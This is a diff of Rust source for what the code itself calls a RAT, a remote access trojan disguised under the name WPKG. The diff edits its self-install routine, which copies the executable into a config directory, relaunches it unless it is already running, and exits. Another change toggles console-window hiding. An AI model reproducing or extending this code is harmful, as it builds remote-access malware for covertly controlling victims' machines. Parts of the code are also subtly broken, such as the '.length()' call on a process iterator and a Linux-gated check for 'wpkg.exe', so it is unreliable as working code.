@@ -1,5 +1,5 @@
 // Remove console window in Windows OS
-#![windows_subsystem = "windows"]
+//#![windows_subsystem = "windows"]
 // TODO: delete it
 #![allow(dead_code)]
 
@@ -41,13 +41,17 @@ async fn main() {
     #[cfg(not(target_os = "windows"))]
     warn!("RAT isn't runned on Windows. Some features may be unavailable. Use for debug only");
 
-    #[cfg(target_os = "windows")]
+    println!("{}",crate::utils::Utils::get_working_dir());
+
+    #[cfg(target_os = "linux")]
     {
         use crate::utils::Utils;
         use platform_dirs::AppDirs;
         use std::env;
         use std::fs;
         use std::process;
+        use std::path::Path;
+        use sysinfo::{ProcessExt, System, SystemExt};
 
         let install = || -> anyhow::Result<()> {
             let exe_path = env::current_exe()?.display().to_string();
@@ -60,12 +64,24 @@ async fn main() {
             if exe_path != exe_target {
                 info!("WPKG not installed. Installing in {}...", config_dir);
 
-                fs::create_dir(config_dir)?;
+                if !Path::new(&config_dir).exists()
+                {
+                    info!("WPKG dir not exists... Creating it...");
+                    fs::create_dir(config_dir)?;
+                }
 
-                fs::copy(exe_path, exe_target.clone())?;
+                if !Path::new(&exe_target).exists()
+                {
+                    info!("Copying WPKG executable to {}...",exe_target);
+                    fs::copy(exe_path, exe_target.clone())?;
+                }
 
-                info!("Running WPKG...");
-                Utils::run_process(&exe_target, "", false);
+                let s = System::new_all();
+                if s.processes_by_name("wpkg.exe").length() == 0
+                {
+                    info!("Running WPKG...");
+                    Utils::run_process(&exe_target, "", false);
+                }
 
                 process::exit(0);
             }
@@ -74,6 +90,7 @@ async fn main() {
 
         if let Err(err) = install() {
             error!("Failed to install WPKG: {}", err);
+            process::exit(0);
         }
     }
 
